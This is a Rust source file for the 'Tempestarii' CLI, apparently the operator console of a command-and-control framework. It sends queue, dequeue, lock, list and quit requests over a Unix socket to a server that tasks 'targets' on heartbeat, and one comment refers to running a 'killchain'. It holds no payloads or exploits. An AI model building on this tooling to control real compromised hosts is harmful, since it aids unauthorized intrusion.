extern crate utilities;

use clap::{Args, Parser, Subcommand};
use plugins::MicrochipPlugin;
use utilities::plugins::{Plugin, SystemMessage};

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::UnixStream;

use rustyline::error::ReadlineError;
use rustyline::{history::FileHistory, Editor};

#[derive(Debug, Parser, Clone)]
#[command(author, version, about, long_about = None)]
#[command(propagate_version = true)]
pub struct Tempestarii {
    #[clap(subcommand)]
    pub command: Commands,
    #[arg(long = "targets", value_name = "TARGET_STRING", default_value = "All")]
    pub targets: Vec<String>,
}

#[derive(Debug, Subcommand, Clone)]
#[group(required = true, multiple = true)]
pub enum Commands {
    /// Queue a command to be used when target hearbeat initializes.
    Queue(Queue),
    /// Dequeue a command from a specific or all targets.
    Dequeue(Dequeue),
    /// Toggles the lock on a specific target.
    Lock,
    /// List the allocated commands for a specific or all targets.
    List,
    /// Exit the Tempestarii CLI.
    Quit(Quit),
}

// #[derive(Debug, Args, Clone)]
// #[command(arg_required_else_help(true))]
// pub struct Listen {
//     #[arg(long = "port", value_name = "PORT", value_parser = utilities::cli::port_validator())]
//     pub port: String,
// }

#[derive(Debug, Args, Clone)]
#[command(arg_required_else_help(true))]
pub struct Queue {
    pub command: String,
}

#[derive(Debug, Args, Clone)]
#[command(arg_required_else_help(true))]
pub struct Dequeue {
    pub command: String,
}

#[derive(Debug, Args, Clone)]
#[command(arg_required_else_help(false))]
pub struct Quit {
    #[clap(long = "destroy")]
    pub destroy: bool,
}

/// The function to start the duplexed unix socket client
pub async fn start_client<T>(
    tx_data: impl SystemMessage,
) -> utilities::core::Result<impl SystemMessage>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    // Open the socket
    let mut stream = UnixStream::connect("tempestarii.socket").await?;

    // Serialize our message request
    let tx_bytes = tx_data.serialize();

    // Send the serialized request to the Tempestarii server
    stream.write_all(&tx_bytes?).await?;
    stream.shutdown().await?;

    // Get the serialized response from the Tempestarii server
    let mut rx_bytes = Vec::new();
    stream.read_to_end(&mut rx_bytes).await?;

    // Deserialize our message response
    let rx_data = T::SystemMessage::deserialize(rx_bytes)?;

    // Return the message response
    Ok(rx_data)
}

/// Queues a record for a target
pub async fn handle_queue<T>(
    state: Queue,
    targets: Vec<String>,
) -> utilities::core::Result<impl SystemMessage>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    println!("{:#?}", state);

    let request = utilities::cli::Request::QUEUE(utilities::cli::Queue {
        command: state.command,
        targets,
    });

    let tx_data = T::SystemMessage::generate(request)?;

    let rx_data = start_client::<T>(tx_data).await?;

    Ok(rx_data)
}

/// Dequeues a record from a target
pub async fn handle_dequeue<T>(
    state: Dequeue,
    targets: Vec<String>,
) -> utilities::core::Result<impl SystemMessage>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    println!("{:#?}", state);

    let request = utilities::cli::Request::DEQUEUE(utilities::cli::Dequeue {
        command: state.command,
        targets,
    });

    let tx_data = T::SystemMessage::generate(request)?;

    let rx_data = start_client::<T>(tx_data).await?;

    Ok(rx_data)
}

/// Toggles the locks on targets
pub async fn handle_lock<T>(targets: Vec<String>) -> utilities::core::Result<impl SystemMessage>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    println!("{:#?}", targets);

    let request = utilities::cli::Request::LOCK(utilities::cli::Lock { targets });

    let tx_data = T::SystemMessage::generate(request)?;

    let rx_data = start_client::<T>(tx_data).await?;

    Ok(rx_data)
}

/// Runs a killchain on a specific target
pub async fn handle_list<T>(targets: Vec<String>) -> utilities::core::Result<impl SystemMessage>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    println!("{:#?}", targets);

    let request = utilities::cli::Request::LIST(utilities::cli::List { targets });

    let tx_data = T::SystemMessage::generate(request)?;

    let rx_data = start_client::<T>(tx_data).await?;

    Ok(rx_data)
}

/// Quits with option to end the server runtime
pub async fn handle_quit<T>(state: Quit) -> utilities::core::Result<impl SystemMessage>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    let request = utilities::cli::Request::QUIT(utilities::cli::Quit {
        destroy: state.destroy,
    });

    let tx_data = T::SystemMessage::generate(request)?;

    let rx_data = start_client::<T>(tx_data).await?;

    Ok(rx_data)
}

async fn execution_flow<T>(cli: Tempestarii) -> utilities::core::Result<bool>
where
    T: Plugin,
    <T as Plugin>::SystemMessage: std::fmt::Display + Clone,
{
    match cli.command {
        Commands::Queue(state) => {
            let rx_data = handle_queue::<T>(state, cli.targets).await?;

            // Downcast the system message for printing or use
            let system_message_downcast =
                utilities::core::downcast_system_message::<_, T::SystemMessage>(&rx_data)?;

            println!("{}", system_message_downcast);
            Ok(false)
        }
        Commands::Dequeue(state) => {
            let rx_data = handle_dequeue::<T>(state, cli.targets).await?;
            // Downcast the system message for printing or use
            let system_message_downcast =
                utilities::core::downcast_system_message::<_, T::SystemMessage>(&rx_data)?;

            println!("{}", system_message_downcast);
            Ok(false)
        }
        Commands::Lock => {
            let rx_data = handle_lock::<T>(cli.targets).await?;
            // Downcast the system message for printing or use
            let system_message_downcast =
                utilities::core::downcast_system_message::<_, T::SystemMessage>(&rx_data)?;

            println!("{}", system_message_downcast);
            Ok(false)
        }
        Commands::List => {
            let rx_data = handle_list::<T>(cli.targets).await?;
            // Downcast the system message for printing or use
            let system_message_downcast =
                utilities::core::downcast_system_message::<_, T::SystemMessage>(&rx_data)?;

            println!("{}", system_message_downcast);
            Ok(false)
        }
        Commands::Quit(state) => {
            let rx_data = handle_quit::<T>(state).await?;
            // Downcast the system message for printing or use
            let system_message_downcast =
                utilities::core::downcast_system_message::<_, T::SystemMessage>(&rx_data)?;

            println!("{}", system_message_downcast);
            Ok(true)
        }
    }
}

#[tokio::main]
async fn main() -> utilities::core::Result<()> {
    utilities::cli::banner()?;

    println!("Tempestarii CLI 0.4.0");
    println!("On Hail and Thunder!");
    println!("myrrha, mineo333, nerelod");

    let mut reader = Editor::<(), FileHistory>::new()?;
    if let Err(_) = reader.load_history("tempestarii_history.txt") {
        println!("Welcome, First Timer!");
    }

    loop {
        let readline = reader.readline("\n[tempestarii] >> ");

        match readline {
            Ok(line) => {
                let _ = reader.add_history_entry(&line);
                let line = line.trim();
                let mut arguments = vec![" ".to_string()];
                let mut user_input = shlex::split(line).ok_or("error: Invalid quoting")?;
                arguments.append(&mut user_input);

                let quit = match Tempestarii::try_parse_from(arguments) {
                    Ok(cli) => execution_flow::<MicrochipPlugin>(cli).await,
                    Err(error) => {
                        let _ = error.print();
                        Ok(false)
                    }
                };

                if quit? {
                    println!("Exiting Tempestarii, Goodbye!");
                    break;
                }
            }
            Err(ReadlineError::Interrupted) => {
                println!("Exiting Tempestarii, Goodbye!");
                break;
            }
            Err(ReadlineError::Eof) => {
                println!("Exiting Tempestarii, Goodbye!");
                break;
            }
            Err(err) => {
                println!("Failed to Read Input: {:?}", err);
                break;
            }
        }
    }
    reader.save_history("tempestarii_history.txt")?;
    Ok(())
}
